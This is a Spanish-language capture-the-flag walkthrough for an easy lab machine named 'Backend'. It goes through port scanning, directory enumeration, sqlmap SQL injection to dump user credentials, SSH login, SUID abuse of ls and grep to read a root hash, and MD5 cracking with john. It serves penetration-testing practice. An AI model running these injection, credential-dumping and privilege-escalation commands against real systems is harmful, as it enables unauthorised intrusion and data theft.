---
description: '✍️ Autor: 4bytes🔍 Dificultad: Fácil  📅 Fecha de creación: 29/08/2024'
---

# Backend

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.17.0.2
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (807).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 172.17.0.2
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (917).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 172.17.0.2
```

para obtener más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (916).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora indagamos sobre el **servicio HTTP**. Se ingresó la **dirección IP** en el navegador lo que llevó a que la página web sea una página bajo desarrollo podemos ver que hay una pestaña de Login.

<figure><img src="../../.gitbook/assets/image (918).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (919).png" alt=""><figcaption></figcaption></figure>

Ahora buscaremos directorios y archivos con la herramienta **Gobuster** a través de:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,txt,php,xml
```

<figure><img src="../../.gitbook/assets/image (921).png" alt=""><figcaption></figcaption></figure>

Probamos con credenciales básicas y con una inyección básica pero nada.

### 🚀 **EXPLOTACIÓN**

Vamos a probar con **sqlmap** para ver que bases de datos hay.

```bash
sqlmap -u "http://172.17.0.2/login.html" --forms --batch --dbs
```

<figure><img src="../../.gitbook/assets/image (920).png" alt=""><figcaption></figcaption></figure>

Ahora vemos el contenido de la base de datos **users**.

```bash
sqlmap -u "http://172.17.0.2/login.html" --forms --batch -D users --tables
```

<figure><img src="../../.gitbook/assets/image (922).png" alt=""><figcaption></figcaption></figure>

Ahora vemos el contenido de la tabla de **usuarios**.

```bash
sqlmap -u "http://172.17.0.2/login.html" --forms --batch -D users -T usuarios --dump
```

<figure><img src="../../.gitbook/assets/image (923).png" alt=""><figcaption></figcaption></figure>

Probamos con esas credenciales pero con pepe logramos loguearnos en SSH.

```bash
ssh pepe@172.17.0.2
```

<figure><img src="../../.gitbook/assets/image (924).png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar. No tenemos permisos **SUDO**.

<figure><img src="../../.gitbook/assets/image (925).png" alt=""><figcaption></figcaption></figure>

Buscamos permisos **SUID**.

```bash
find / -perm -4000 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (926).png" alt=""><figcaption></figcaption></figure>

Nos llama la atención **ls** y **grep** por lo que buscamos en esta [página ](https://gtfobins.github.io/)cómo explotarlo.

```bash
/usr/bin/ls -la /root
/usr/bin/grep '' /root/pass.hash
```

<figure><img src="../../.gitbook/assets/image (927).png" alt=""><figcaption></figcaption></figure>

Vemos que es un hash en formato **MD5** por lo que vamos a desencriptarlo.

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
```

<figure><img src="../../.gitbook/assets/image (928).png" alt=""><figcaption></figcaption></figure>

Nos logueamos como root.

<figure><img src="../../.gitbook/assets/image (929).png" alt=""><figcaption></figcaption></figure>
